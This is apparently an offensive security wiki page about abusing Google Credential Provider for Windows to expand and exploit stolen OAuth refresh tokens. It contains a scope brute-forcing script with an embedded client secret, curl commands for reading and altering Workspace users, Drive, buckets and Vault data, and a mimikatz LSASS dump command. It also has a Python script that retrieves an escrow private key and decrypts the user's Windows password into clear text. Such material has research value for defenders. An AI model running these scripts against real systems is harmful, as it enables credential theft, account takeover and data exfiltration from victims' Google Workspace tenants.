# GCPW - Scopes, API Usage, and Password Recovery

### GCPW - Scopes

> [!NOTE]
> Note that even having a refresh token, it's not possible to request any scope for the access token as you can only requests the **scopes supported by the application where you are generating the access token**.
>
> Also, the refresh token is not valid in every application.

By default GCPW won't have access as the user to every possible OAuth scope, so using the following script we can find the scopes that can be used with the `refresh_token` to generate an `access_token`:

<details>

<summary>Bash script to brute-force scopes</summary>

```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
    echo -ne "Testing $scope           \r"
    if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
     --data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
     --data "grant_type=refresh_token" \
     --data "refresh_token=1//0<EXAMPLE_GOOGLE_REFRESH_TOKEN_REDACTED>" \
     --data "scope=$scope" \
     https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
        echo ""
        echo $scope
        echo $scope >> /tmp/valid_scopes.txt
    fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```

</details>

And this is the output I got at the time of the writing:

<details>

<summary>Brute-forced scopes</summary>

```
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```

</details>

Moreover, checking the Chromium source code it's possible to [**find this file**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google_apis/gaia/gaia_constants.cc#L24), which contains **other scopes** that can be assumed that **doesn't appear in the previously brute-forced lis**t. Therefore, these extra scopes can be assumed:

<details>

<summary>Extra scopes</summary>

```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```

</details>

Note that the most interesting one is possibly:

```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```

However, I tried to use this scope to access gmail or list groups and it didn't work, so I don't know how useful it still is.

**Get an access token with all those scopes**:

<details>

<summary>Bash script to generate access token from refresh_token with all the scopes</summary>

```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome" | tr '\n' ' ')

curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
     --data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
     --data "grant_type=refresh_token" \
     --data "refresh_token=1//0<EXAMPLE_GOOGLE_REFRESH_TOKEN_REDACTED>" \
     --data "scope=$scope" \
     https://www.googleapis.com/oauth2/v4/token
```

</details>

Some examples using some of those scopes:

<details>

<summary>https://www.googleapis.com/auth/userinfo.email & https://www.googleapis.com/auth/userinfo.profile</summary>

```bash
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/oauth2/v2/userinfo"

{
  "id": "100203736939176354570",
  "email": "hacktricks@example.com",
  "verified_email": true,
  "name": "John Smith",
  "given_name": "John",
  "family_name": "Smith",
  "picture": "https://lh3.googleusercontent.com/a/ACg8ocKLvue[REDACTED]wcnzhyKH_p96Gww=s96-c",
  "locale": "en",
  "hd": "example.com"
}
```

</details>

<details>

<summary>https://www.googleapis.com/auth/admin.directory.user</summary>

```bash
# List users
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/admin/directory/v1/users?customer=<workspace_id>&maxResults=100&orderBy=email"

# Create user
curl -X POST \
  -H "Authorization: Bearer $access_token" \
  -H "Content-Type: application/json" \
  -d '{
        "primaryEmail": "newuser@hdomain.com",
        "name": {
          "givenName": "New",
          "familyName": "User"
        },
        "password": "UserPassword123",
        "changePasswordAtNextLogin": true
      }' \
  "https://www.googleapis.com/admin/directory/v1/users"
```

</details>

<details>

<summary>https://www.googleapis.com/auth/drive</summary>

```bash
# List files
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/drive/v3/files?pageSize=10&fields=files(id,name,modifiedTime)&orderBy=name"
{
  "files": [
    {
      "id": "1Z8m5ALSiHtewoQg1LB8uS9gAIeNOPBrq",
      "name": "Veeam new vendor form 1 2024.docx",
      "modifiedTime": "2024-08-30T09:25:35.219Z"
    }
  ]
}

# Download file
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/drive/v3/files/<file-id>?alt=media" \
  -o "DownloadedFileName.ext"

# Upload file
curl -X POST \
  -H "Authorization: Bearer $access_token" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @path/to/file.ext \
  "https://www.googleapis.com/upload/drive/v3/files?uploadType=media"
```

</details>

<details>

<summary>https://www.googleapis.com/auth/devstorage.read_write</summary>

```bash
# List buckets from a project
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/storage/v1/b?project=<project-id>"

# List objects in a bucket
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/storage/v1/b/<bucket-name>/o?maxResults=10&fields=items(id,name,size,updated)&orderBy=name"

# Upload file to bucket
curl -X POST \
  -H "Authorization: Bearer $access_token" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @path/to/yourfile.ext \
  "https://www.googleapis.com/upload/storage/v1/b/<BUCKET_NAME>/o?uploadType=media&name=<OBJECT_NAME>"

# Download file from bucket
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/storage/v1/b/BUCKET_NAME/o/OBJECT_NAME?alt=media" \
  -o "DownloadedFileName.ext"
```

</details>

<details>

<summary>https://www.googleapis.com/auth/spreadsheets</summary>

```bash
# List spreadsheets
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/drive/v3/files?q=mimeType='application/vnd.google-apps.spreadsheet'&fields=files(id,name,modifiedTime)&pageSize=100"

# Download as pdf
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://www.googleapis.com/drive/v3/files/106VJxeyIsVTkixutwJM1IiJZ0ZQRMiA5mhfe8C5CxMc/export?mimeType=application/pdf" \
  -o "Spreadsheet.pdf"

# Create spreadsheet
curl -X POST \
  -H "Authorization: Bearer $access_token" \
  -H "Content-Type: application/json" \
  -d '{
        "properties": {
          "title": "New Spreadsheet"
        }
      }' \
  "https://sheets.googleapis.com/v4/spreadsheets"

# Read data from a spreadsheet
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A1:C10"

# Update data in spreadsheet
curl -X PUT \
  -H "Authorization: Bearer $access_token" \
  -H "Content-Type: application/json" \
  -d '{
        "range": "Sheet1!A2:C2",
        "majorDimension": "ROWS",
        "values": [
          ["Alice Johnson", "28", "alice.johnson@example.com"]
        ]
      }' \
  "https://sheets.googleapis.com/v4/spreadsheets/<SPREADSHEET_ID>/values/Sheet1!A2:C2?valueInputOption=USER_ENTERED"

# Append data
curl -X POST \
  -H "Authorization: Bearer $access_token" \
  -H "Content-Type: application/json" \
  -d '{
        "values": [
          ["Bob Williams", "35", "bob.williams@example.com"]
        ]
      }' \
  "https://sheets.googleapis.com/v4/spreadsheets/SPREADSHEET_ID/values/Sheet1!A:C:append?valueInputOption=USER_ENTERED"
```

</details>

<details>

<summary>https://www.googleapis.com/auth/ediscovery (Google Vault)</summary>

**Google Workspace Vault** is an add-on for Google Workspace that provides tools for data retention, search, and export for your organization's data stored in Google Workspace services like Gmail, Drive, Chat, and more.

- A **Matter** in Google Workspace Vault is a **container** that organizes and groups together all the information related to a specific case, investigation, or legal matter. It serves as the central hub for managing **Holds**, **Searches**, and **Exports** pertaining to that particular issue.
- A **Hold** in Google Workspace Vault is a **preservation action** applied to specific users or groups to **prevent the deletion or alteration** of their data within Google Workspace services. Holds ensure that relevant information remains intact and unmodified for the duration of a legal case or investigation.

```bash
# List matters
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://vault.googleapis.com/v1/matters?pageSize=10"

# Create matter
curl -X POST \
  -H "Authorization: Bearer $access_token" \
  -H "Content-Type: application/json" \
  -d '{
        "name": "Legal Case 2024",
        "description": "Matter for the upcoming legal case involving XYZ Corp.",
        "state": "OPEN"
      }' \
  "https://vault.googleapis.com/v1/matters"

# Get specific matter
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://vault.googleapis.com/v1/matters/<MATTER_ID>"

# List holds in a matter
curl -X GET \
  -H "Authorization: Bearer $access_token" \
  "https://vault.googleapis.com/v1/matters/<MATTER_ID>/holds?pageSize=10"
```

More [API endpoints in the docs](https://developers.google.com/vault/reference/rest).

</details>

## GCPW - Recovering clear text password

To abuse GCPW to recover the clear text of the password it's possible to dump the encrypted password from **LSASS** using **mimikatz**:

```bash
mimikatz_trunk\x64\mimikatz.exe privilege::debug token::elevate lsadump::secrets exit
```

Then search for the secret like `Chrome-GCPW-<sid>` like in the image:

<img src="../../../images/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption>

Then, with an **access token** with the scope `https://www.google.com/accounts/OAuthLogin` it's possible to request the private key to decrypt the password:

<details>

<summary>Script to obtain the password in clear-text given the access token, encrypted password and resource id</summary>

```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
    try:
        # Request to get the private key
        response = requests.get(
            f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
            headers={
                "Authorization": f"Bearer {access_token}"
            }
        )

        # Check if the response is successful
        if response.status_code == 200:
            private_key = response.json()["base64PrivateKey"]
            # Properly format the RSA private key
            private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
            return private_key
        else:
            raise ValueError(f"Failed to retrieve private key: {response.text}")

    except requests.RequestException as e:
        print(f"Error occurred while requesting the private key: {e}")
        return None

def decrypt_password(access_token, lsa_secret):
    try:
        # Obtain the private key using the resource_id
        resource_id = lsa_secret["resource_id"]
        encrypted_data = b64decode(lsa_secret["encrypted_password"])

        private_key_pem = get_decryption_key(access_token, resource_id)
        print("Found private key:")
        print(private_key_pem)

        if private_key_pem is None:
            raise ValueError("Unable to retrieve the private key.")

        # Load the RSA private key
        rsa_key = RSA.import_key(private_key_pem)
        key_size = int(rsa_key.size_in_bits() / 8)

        # Decrypt the encrypted data
        cipher_rsa = PKCS1_OAEP.new(rsa_key)
        session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

        # Extract the session key and other data from decrypted payload
        session_header = session_key[:32]
        session_nonce = session_key[32:]
        mac = encrypted_data[-16:]

        # Decrypt the AES GCM data
        aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
        decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

        print("Decrypted Password:", decrypted_password.decode("utf-8"))

    except Exception as e:
        print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
    "encrypted_password": "<encrypted-password>",
    "resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```

</details>

It's possible to find the key components of this in the Chromium source code:

- API domain: [kDefaultEscrowServiceServerUrl[] = L"https://devicepasswordescrowforwindows-pa.googleapis.com";](https://github.com/chromium/chromium/blob/a66c3ddadf5699b5493c3bce9498e53b249d5ba3/chrome/credential_provider/gaiacp/mdm_utils.cc#L78)
- API endpoint: [kEscrowServiceGenerateKeyPairPath](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential_provider/gaiacp/password_recovery_manager.cc#L70)
- Inside the [password_recovery_manager.cc](https://github.com/chromium/chromium/blob/c4920cc4fcae6defb75dc08a3b774a9bc3172c47/chrome/credential_provider/gaiacp/password_recovery_manager.cc) it's possible to see how the API endpoint is used to get a **public key to encrypt the password and the private key to decrypt** it in the needed methods and also how the encrypted password is **stored and retreived from the LSASS process**.

## GCPW - Recovering locally stored password hash?

It was checked that even if the computer doesn't have internet access it's possible to login inside of it. Therefore, **some kind of password hash might be stored locally. (TODO)**

## References

- [https://www.youtube.com/watch?v=FEQxHRRP_5I](https://www.youtube.com/watch?v=FEQxHRRP_5I)
- [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)
